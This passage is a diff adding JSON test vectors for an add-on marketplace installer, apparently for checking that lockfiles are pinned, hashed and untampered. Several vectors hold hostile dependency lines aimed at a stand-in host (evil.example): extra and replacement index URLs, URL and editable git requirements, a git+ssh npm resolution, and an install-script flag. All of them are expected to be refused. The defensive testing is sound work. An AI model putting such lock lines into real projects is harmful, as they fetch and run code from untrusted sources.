+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:b14151bafd891d27e63ebd3783747b4c836e700a2f74a7da3e8225c06e26f3ee",
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.lock_missing"
+   },
+   "name": "install_lock_missing"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "requirements.txt": "requests==2.32.3\n"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:4cfdd5e4e2364917a03c0e5a1e65fc9605f920d5f637ecd501cf0c4d4e54f726",
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.lock_invalid"
+   },
+   "name": "install_lock_without_hash"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "requirements.txt": "requests>=2.0 --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:a167c65cc9a9bf00bee2f7425e366e840c497f5cf834cdbb0efb68f1ef942411",
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.lock_invalid"
+   },
+   "name": "install_lock_unpinned"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "requirements.txt": "--extra-index-url https://evil.example/simple\nrequests==2.32.3 --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:e89d79a55e8455968a95632ac8721eaa3a3e7917c420dde5e851ebc17740390d",
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.lock_invalid"
+   },
+   "name": "install_lock_extra_index"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "requirements.txt": "requests @ https://evil.example/r.tar.gz --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:813386212b90259a0224c81df2fcbf7ca96f8eb1db124d3ac0baaed8ce498043",
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.lock_invalid"
+   },
+   "name": "install_lock_url_requirement"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "requirements.txt": "-e git+https://evil.example/r.git#egg=r\n"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:82ad8e3c2db65353e16d214396187165fef0b879c6f4775f52ee6fbe1ee47cb8",
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.lock_invalid"
+   },
+   "name": "install_lock_editable"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "requirements.txt": "# generated by uv export\nrequests==2.32.3 \\\n    --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nidna==3.7 --hash=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\nwheel==0.43.0\n"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:354812492447f865068fe2660c1f6eb3592cf824021bb2044d50d1b0e38630ec",
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.lock_invalid"
+   },
+   "name": "install_lock_one_unhashed_among_hashed"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "requirements.txt": "# nothing\n"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:8576f4d50466af29ceda41fc0a711dacdb63709b08f4730b7deb4c1c62c4b293",
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.lock_invalid"
+   },
+   "name": "install_lock_empty"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "package-lock.json": "{\"lockfileVersion\": 3, \"packages\": {\"\": {}, \"node_modules/x\": {\"resolved\": \"https://registry.npmjs.org/x.tgz\"}}}"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:92f97e5e180d5dd9696901b2fbcf359fdcba6ee949f41c70468de12107fd0896",
+       "runtime": {
+        "kind": "node-package-lock",
+        "lock": "package-lock.json"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.lock_invalid"
+   },
+   "name": "install_node_lock_without_integrity"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "package-lock.json": "{\"lockfileVersion\": 3, \"packages\": {\"\": {}, \"node_modules/x\": {\"resolved\": \"git+ssh://git@evil.example/x.git\", \"integrity\": \"sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\"}}}"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:495f668f91eef93d97a6ae7588f7a27f6f5c0ede609f41dad53ecfd499c3a474",
+       "runtime": {
+        "kind": "node-package-lock",
+        "lock": "package-lock.json"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.lock_invalid"
+   },
+   "name": "install_node_lock_git_dependency"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "package-lock.json": "{\"lockfileVersion\": 3, \"packages\": {\"\": {}, \"node_modules/x\": {\"resolved\": \"https://registry.npmjs.org/x.tgz\", \"integrity\": \"sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\", \"hasInstallScript\": true}}}"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:b5366455bcc94dd1b4eb251b588e517ec8b3b65019ea639e7be86522ba83d1b9",
+       "runtime": {
+        "kind": "node-package-lock",
+        "lock": "package-lock.json"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.lock_invalid"
+   },
+   "name": "install_node_lock_install_script"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\", \"serve_http\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "requirements.txt": "# generated by uv export\nrequests==2.32.3 \\\n    --hash=sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc\nidna==3.7 --hash=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network",
+        "serve_http"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:50383dc9e008e3a6cde3a80b1d772cd30a53a1d9de466893af42d8fb7b9ad0ac",
+       "publisher": {
+        "key": "BBmy74NSZ2uabtb5xyo1ERHf65Yu_mYZXuuszXk2UPyX_gElcXlNAPLDd6mJgVaqwTsULdeMeUFZ0DWZZ8HN9XQ",
+        "sig": "3hXFVFR459upswu9f4IyxbF4yVwIW9OZkmjDaifHBge-fQxQTNNwJmaDZJPAkV7iITJ3C_aLn5gFCYxMmSXaXg"
+       },
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "refuse": "market.digest_mismatch"
+   },
+   "name": "install_lock_tampered_after_indexing"
+  },
+  {
+   "args": {
+    "kind": "python-requirements",
+    "text": "# generated by uv export\nrequests==2.32.3 \\\n    --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nidna==3.7 --hash=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n"
+   },
+   "check": "lock",
+   "expect": {
+    "ok": {}
+   },
+   "name": "lock_python_ok"
+  },
+  {
+   "args": {
+    "kind": "python-requirements",
+    "text": "colorama==0.4.6 ; sys_platform == 'win32' --hash=sha256:dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\n"
+   },
+   "check": "lock",
+   "expect": {
+    "ok": {}
+   },
+   "name": "lock_python_environment_marker_ok"
+  },
+  {
+   "args": {
+    "kind": "python-requirements",
+    "text": "--index-url https://evil.example\n"
+   },
+   "check": "lock",
+   "expect": {
+    "refuse": "market.lock_invalid"
+   },
+   "name": "lock_python_option_line"
+  }
+ ],
+ "format": "orch.market.vectors/1",
+ "keys": {
+  "jane": "BBmy74NSZ2uabtb5xyo1ERHf65Yu_mYZXuuszXk2UPyX_gElcXlNAPLDd6mJgVaqwTsULdeMeUFZ0DWZZ8HN9XQ",
+  "mallory": "BMlyPZZElYwTNIMMA1ZFxa58Mathf1eNt_ZfmZdjNjESVgGHwHHgu2mwkMNzREBDL8i859JRPVLmCCwe0w8TnzE",
+  "official": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc"
+ }
+}
